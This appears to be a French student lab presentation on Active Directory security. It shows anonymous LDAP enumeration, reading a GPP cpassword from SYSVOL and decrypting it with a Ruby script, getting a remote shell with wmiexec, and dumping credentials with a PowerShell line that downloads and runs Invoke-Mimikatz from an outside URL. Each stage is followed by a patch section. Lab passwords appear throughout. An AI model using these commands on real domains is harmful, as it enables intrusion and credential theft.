[INCLUDE=presentation]
Title         : Sécurité des annuaires
Sub Title     : Travaux pratiques
Author        : Adrien GENNEVOIS - Erwan JAN
Affiliation   : ENSIBS
Reveal Theme  : sky
Beamer Theme  : singapore

[TITLE]

# Sommaire

[TOC]

#Contexte

Lors de ce TP nous avions à disposition 1 serveur LDAP ainsi que 1 ordinateur qui était dans le domaine active directory de ce serveur.  
  
La seule information que nous avions à notre disposition était les adresses IP de ces deux machines.  
  
Le but était de trouver les failles de cette architecture de les exploiter afin de récupérer le plus d'informations possibles puis de trouver le moyen de les patcher.

~ Begin Vertical
# Faille #1 : Enumeration LDAP

Disposant comme seule information des IP des deux machines dont celle du LDAP, la première chose à faire est d'explorer le contenu de cet annuaire.

Dans un AD il est possible d'effectuer des requêtes LDAP de façon anonyme (sans s'authentifier en tant qu'utilisateur de l'AD).

Ainsi, n'importe qui connaissant l'adresse du LDAP peut effectuer des requêtes anonymes.

## Exploitation de la faille 1 

De nombreux outils existent pour explorer un AD avec des requêtes LDAP. Nous avons utilisé **Enum4Linux** qui dresse un rapport sur tout ce qu'il a trouvé dans l'AD.

~ Slide

Dans un premier temps nous avons utilisé les paramètres par défaut de Enum4Linux. Voici un exemple des données importantes que Enum4Linux a récolté : 

* Autorisation des comptes anonymes

``` javascript
[+] Server 192.168.1.234 allows sessions using username '', password ''
```
* Nom du domaine :
``` javascript
[+] Got domain/workgroup name: GALACTIC
```
* SID du domaine :
``` javascript
Domain Name: GALACTIC
Domain Sid: S-1-5-21-4175656857-897258720-2408443730
[+] Host is part of a domain (not a workgroup)
```
~
~ Slide
Le SID (Security Identifier, un identifiant unique) va permettre de découvrir l'ensemble des objets présents dans le domaine.
Par défaut, Enum4Linux va chercher les SID de 1000 à 1050 ce qui ne nous permet pas d'avoir accès à toutes les informations. 

Nous choisisons une plage plus large de SID de 1000 à 1500 on découvre un ensemble d'objets beaucoup plus intéressant, il s'agit de comptes utilisateurs du domaine :
``` javascript
...
...3730-1114 GALACTIC\d.vador (Local User)
...3730-1115 GALACTIC\a.skywalker (Local User)
...3730-1116 GALACTIC\g.tarkin (Local User)
...3730-1117 GALACTIC\testad (Local User)
```

~
~ Slide

Parmis ces utilisateurs, un en particulier semble spécial, il s'agit de l'utilisateur **testad**. On devine facilement son mot de passe, il d'agit de "testad".

Si on utilise ce compte pour effectuer une nouvelle enumération cela nous permet d'avoir accès a encore plus d'informations :

~
~ Slide

- L'ensemble des utilisateurs du groupe avec des description contenant les mots de passe en voici un extrait : 
``` javascript
index: 0x1040 RID: 0x466 acb: 0x00000011 Account: k.ren	
Name: Kylo REN	Desc: mdp = kylo
index: 0xf83 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	
Name: (null)	Desc: Key Distribution Center Service Account
index: 0x103f RID: 0x465 acb: 0x00000010 Account: m.surik	
Name: Meetra SURIK	Desc: password*123
index: 0x1032 RID: 0x45d acb: 0x00000010 Account: testad	
Name: testad	Desc: testad account for crash tests on the deathstar
```
- Ainsi que l'ensemble des dossiers partagés par le SMB : 
``` javascript
[+] Attempting to map shares on 192.168.1.234
//192.168.1.234/ADMIN$	Mapping: DENIED, Listing: N/A
//192.168.1.234/C$	Mapping: DENIED, Listing: N/A
//192.168.1.234/IPC$	Mapping: OK	Listing: DENIED
//192.168.1.234/NETLOGON	Mapping: OK, Listing: OK
//192.168.1.234/SYSVOL	Mapping: OK, Listing: OK
```
~
## Patch de la faille 1

La vulnérabilité est rendue possible par la possiblité d'effectuer des requêtes LDAP avec le compte anonyme. En effet si ce compte est désactivé, l'énumération n'aurait pas été possible. 

#### Ainsi il est important de désactiver cette option.

Attention : la désactivation de cette option peut rendre certaines applications inopérantes puisqu'elles utilisent le compte anonyme.

#### De plus il ne faut pas laisser un compte de test actif avec un mot de passe qui se devine facilement.

~ End Vertical

~ Begin Vertical

# Faille #2 : SMB : Dossier SYSVOL accessible

En plus des informations que nous avions à disposition pour l'exploitation de la faille précédente, nous avons en plus accès :

- au compte testad
- service SMB 
- dossier SYSVOL. 

## Exploitation de la faille 2

Maintenant que nous possédons un compte sur le domaine, nous allons chercher à récupérer les GPO (politiques de sécurité) qui sont stockés dans le dossier SYSVOL (Système Volume).
Cela nous permettra d'avoir plus d'informations comme des mots de passe.

~ Slide

Pour commencer, on accède via le serveur smb au dossier sysvol contenant les GPO. Pour cela on utilise le compte que l'on a trouvé précèdement: testad/testad.


``` javascript
~/Documents/enum4linux-0.8.9$ smbclient //192.168.1.234/SYSVOL -U GALACTIC/testad
WARNING: The "syslog" option is deprecated
Enter GALACTIC/testad's password: 
Domain=[GALACTIC] OS=[Windows Server 2012 R2 Standard Evaluation 9600]  
Server=[Windows Server 2012 R2 Standard Evaluation 6.3]
smb: \> ls
  .                                   D        0  Fri Mar  9 22:03:12 2018
  ..                                  D        0  Fri Mar  9 22:03:12 2018
  GALACTIC.LAN                        D        0  Fri Mar  9 22:03:12 2018

		7774207 blocks of size 4096. 5293702 blocks available
```


~
~ Slide 
Nous allons ensuite évoluer dans l'arborescence afin de trouver le fichier Group.xml qui contient les paramètres des GPO et notamment le mot de passe du compte administrateur.
``` javascript
\Policies\{62DB8100-2596-499B-AABF-55FE554CE724}\Machine\Preferences\Groups\> ls
  .                                   D        0  Sat Mar 10 22:07:49 2018
  ..                                  D        0  Sat Mar 10 22:07:49 2018
  Groups.xml                          A      560  Sat Mar 10 22:07:54 2018

		7774207 blocks of size 4096. 5293430 blocks available
```
Enfin, on affiche le contenu du fichier Group.xml et on récupère le contenu du champ cpassword.
``` javascript
~/Documents$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"> 
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)"  
image="2" changed="2018-03-10 21:07:54" uid="{9FC58681-90A0-4F1B-8599-76C968F68305}" 
userContext="0" removePolicy="0"> <Properties action="U" newName="" fullName=""  
description="" cpassword="O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA" changeLogon="0"  
noChange="1" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN"   
userName="Administrator (built-in)"/> </User> </Groups>
```
~
~ Slide
Le cpassword que nous avons récupéré n'est actuellement pas lisible.En effet celui-ci est chiffrer en AES et il va falloir le déchiffrer. Pour cela on récupère le script ruby de gpp-decrypt, la clé de déchiffrement étant connue :
``` javascript
require 'rubygems'
require 'openssl'
require 'base64'
encrypted_data = "O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA"

def decrypt(encrypted_data)
  padding = "=" * (4 - (encrypted_data.length % 4))
  epassword = "#{encrypted_data}#{padding}"
  decoded = Base64.decode64(epassword)

  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4$
  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
  aes.decrypt
  aes.key = key
  plaintext = aes.update(decoded)
  plaintext << aes.final
  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

  return pass
end
blah = decrypt(encrypted_data)
puts blah
```
~
~ Slide
On execute ensuite le script afin d'obtenir le mot de passe du compte administrateur : SuPa_MDP_S1TH.
``` javascript
~/Documents/gpp-decrypt-master$ ruby gpp-decrypt.rb
SuPa_MDP_S1TH
```
Une fois en possession des identifiants du compte administrateur, on peut accéder à un powershell sur la machine en exploitant une faille WMI grâce au script wmiexec.py

``` javascript
parallels@debian-gnu-linux-vm:~/Documents/impacket/examples$ python wmiexec.py 
"administrateur":"SuPa_MDP_S1TH"@"192.168.1.221"

Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

~

~ Slide
Une fois connecté à distance sur le poste, il est possible de lister tous les utilisateurs en se rendant dans C:\Users.
``` javascript
C:\Users>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/2.4/lib/standard-encodings.html
and then execute wmiexec.py again with -codec and the corresponding codec
 Le volume dans le lecteur C n'a pas de nom.
 Le num�ro de s�rie du volume est C658-91DA

 R�pertoire de C:\Users

11/03/2018  11:29    <DIR>          .
11/03/2018  11:29    <DIR>          ..
21/11/2016  08:46    <DIR>          Administrateur
26/03/2018  14:58    <DIR>          Administrateur.PC-VADOR
11/03/2018  00:23    <DIR>          d.sion
10/03/2018  23:42    <DIR>          d.traya
10/03/2018  23:48    <DIR>          d.vador
10/03/2018  23:08    <DIR>          defaultuser0
11/03/2018  00:51    <DIR>          hacker
11/03/2018  11:29    <DIR>          iis_admin
10/03/2018  23:37    <DIR>          padawan
21/11/2016  08:44    <DIR>          Public
```
On possède donc maintenant un accès sur le poste du domaine et le nom de tous les utilisateurs du poste
~
## Patch de la faille 2

### Cpassword

Windows a réalisé un patch permetant de ne plus afficher le mot de passe administrateur local dans le fichier de préférences de l'AD : https://community.spiceworks.com/topic/1347328-how-to-change-domain-password-policy

Il empeche alors l'attaquant à avoir accès au mot de passe dans le fichier groups.xml

### WMI 

Accès à travers WMI:  

~ End Vertical

~ Begin Vertical

# Faille #3 : Mots de passes et hashes des utilisateurs accessibles

Nous possédons maintenant encore plus d'informations que lors de l'exploitation de la faille précédente : nous avons accès au poste qui est dans le domaine via un powershell ainsi que les informations du compte administrateur (administrateur/SuPa_MDP_S1TH)

## Exploitation de la faille 3

Le but va être de récupérer toujours plus d'informations grâce à Mimikatz, un outil qui utilise différents module afin de récupérer un maximum d'informations sur un Windows.

~ Slide
Maintenant que nous possédons un powershell sur le poste, nous allons utiliser Mimikatz afin de récupérer tout les mots de passe accessibles des utilisateurs du poste:
``` javascript
C:\Users\Public>powershell "IEX (New-Object Net.WebClient).DownloadString 
('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
```
~

~ Slide
Le résultat de la commande étant très long, voici le passage qui va nous permettre de récupérer de nouvelles informations et notamment un mot de passe :

``` javascript
	credman :	
	 [00000000]
	 * Username : GALACTIC\d.traya
	 * Domain   : d.traya
	 * Password : triumvirat
	 [00000001]
	 * Username : GALACTIC\d.traya
	 * Domain   : GALACTIC\d.traya
	 * Password : triumvirat
```
Mimikatz nous a donc permis de récupérer les identifiants de d.traya (d.traya/triumvirat)
~ 

## Patch de la vulnérabilité 3

### - Créer un group spécifique : Protected User

Avec cette modification un administrateur n'aura pas la vu sur les utilisateurs du groupe "Protected user".


### - Installer le patch KB2871997

[patch KB2871997]

[patch KB2871997]: https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a "patch KB2871997"

### Empecher le stockage de mot de passe dans la mémoire 

Par défault windows stocke les mots de passe dans la mémoire. Mais il est possible de désactiver cette fonctionnalité en passant la variable à 0.

---

source : [protect against mimikatz]

[protect against mimikatz]: https://jimshaver.net/2016/02/14/defending-against-mimikatz/ "patch against mimikatz"


~ End Vertical